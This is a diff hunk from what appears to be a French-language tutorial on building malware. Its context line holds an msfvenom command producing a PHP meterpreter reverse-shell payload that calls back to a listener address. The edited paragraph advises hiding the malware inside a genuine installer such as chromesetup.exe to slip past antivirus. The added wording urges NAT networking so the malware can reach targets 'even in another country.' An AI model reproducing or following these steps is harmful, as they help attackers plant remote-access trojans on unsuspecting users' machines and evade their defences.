@@ -238,7 +238,7 @@ msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.56.101 lport=7000 -f raw >
 
 ## dans virtual box :
 
-### dans kali linux changer la configuration du reseau en acces par pont , cela permettra de telechargerdes ressource a infecter, vous pourrez inserrez votre malwar dans un vrai exe connu comme chromesetup.exe. vous serrez le plus discret avec les anti virus en vous faisant passer pour un executable tout a fait normal ( en conservant sa signature)
+### dans kali linux changer la configuration du reseau en acces par pont , cela permettra de telechargerdes ressource a infecter mais si vous voulez vraiment avoir un malwar qui peut se connecter partout meme dans un autre pays choisissez la connexion NAT, vous pourrez inserrez votre malwar dans un vrai exe connu comme chromesetup.exe. vous serrez le plus discret avec les anti virus en vous faisant passer pour un executable tout a fait normal ( en conservant sa signature)
 
 <img width="1392" height="733" alt="image" src="https://github.com/user-attachments/assets/8f901a2e-b4c9-4794-b8e1-8bd1ea27088a" />
 
